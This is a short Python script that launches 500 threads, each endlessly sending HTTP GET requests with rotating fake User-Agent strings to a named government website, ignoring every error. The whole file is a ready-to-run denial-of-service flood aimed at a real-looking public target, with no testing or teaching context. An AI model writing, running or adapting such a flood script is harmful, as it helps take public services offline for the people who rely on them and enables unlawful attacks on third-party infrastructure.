import requests
import threading
from random import choice

def flood():
    url = "http://online.gov.vn"
    while True:
        try:
            requests.get(url, headers={"User-Agent": choice(["Windows", "Mac", "Linux", "iPhone", "Android"])})
        except:
            pass

for _ in range(500):
    threading.Thread(target=flood).start()
